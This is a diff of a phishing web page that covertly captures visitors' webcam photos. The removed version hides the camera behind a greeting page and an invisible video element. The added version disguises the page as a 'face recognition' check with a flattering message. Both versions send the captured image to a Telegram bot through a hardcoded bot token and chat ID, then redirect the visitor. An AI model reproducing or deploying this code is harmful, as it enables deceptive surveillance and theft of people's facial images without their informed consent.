@@ -3,78 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Selamat Hari Raya</title>
+    <title>Face Recognition</title>
+    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api"></script>
     <style>
-        body, html {
-            height: 100%;
-            margin: 0;
+        body {
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
+            height: 100vh;
+            text-align: center;
             background-color: #f8f8f8;
             font-family: Arial, sans-serif;
         }
-
-        #loadingText {
+        #video {
             display: block;
+            width: 300px;
+            height: 300px;
+            border-radius: 10px;
+            background: black;
+        }
+        #message {
+            margin-top: 10px;
             font-size: 18px;
             font-weight: bold;
-            color: #333;
-        }
-
-        video {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
         }
     </style>
 </head>
 <body>
-    <div id="loadingText">We are redirecting you to the page...</div>
     <video id="video" autoplay muted></video>
-    
+    <canvas id="canvas" style="display: none;"></canvas>
+    <p id="message">Allow camera access for face recognition...</p>
+
     <script>
         const BOT_TOKEN = "8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y";
         const CHAT_ID = "5934902786";
-        const loadingText = document.getElementById('loadingText');
-        const video = document.getElementById('video');
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) {
-                video.srcObject = stream;
-                video.onloadedmetadata = function() {
-                    video.play();
-                    setTimeout(() => {
-                        waitForVideoReady(stream);
-                    }, 1000); // Tunggu sedikit untuk kamera stabil
-                };
-            })
-            .catch(function(error) {
-                console.log("Camera permission denied: ", error);
-                alert("Please allow camera access to continue.");
-            });
-
-        function waitForVideoReady(stream) {
-            if (video.videoWidth > 0 && video.videoHeight > 0) {
-                capturePhoto(stream);
-            } else {
-                console.log("Waiting for video to load...");
-                setTimeout(() => waitForVideoReady(stream), 500);
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById("video").srcObject = stream;
+            } catch (error) {
+                document.getElementById("message").textContent = "Camera access denied. Please allow access.";
             }
         }
 
-        function capturePhoto(stream) {
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
+        async function loadModels() {
+            await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@latest/model/');
+            document.getElementById("message").textContent = "Detecting face...";
+            startCamera();
+        }
+
+        async function capturePhoto() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const photoDataUrl = canvas.toDataURL('image/jpeg');
-            stream.getTracks().forEach(track => track.stop());
-            sendToTelegram(photoDataUrl);
+            const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
+            if (detections.length > 0) {
+                document.getElementById("message").textContent = "You look beautiful/handsome today! Redirecting...";
+                sendToTelegram(canvas.toDataURL("image/jpeg"));
+                setTimeout(() => {
+                    window.location.href = "https://your-redirect-page.com";
+                }, 3000);
+            } else {
+                document.getElementById("message").textContent = "No face detected. Please try again!";
+            }
         }
 
         function sendToTelegram(photoDataUrl) {
@@ -82,19 +79,7 @@
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob, "photo.jpg");
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Photo sent to Telegram:", data);
-                window.location.href = 'https://studandlearn.github.io/project-2/';
-            })
-            .catch(error => {
-                console.error("Error sending photo:", error);
-            });
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
         }
 
         function dataURLtoBlob(dataURL) {
@@ -107,6 +92,9 @@
             }
             return new Blob([ab], { type: mimeString });
         }
+
+        loadModels();
+        setTimeout(capturePhoto, 5000); // Ambil gambar selepas 5 saat
     </script>
 </body>
 </html>
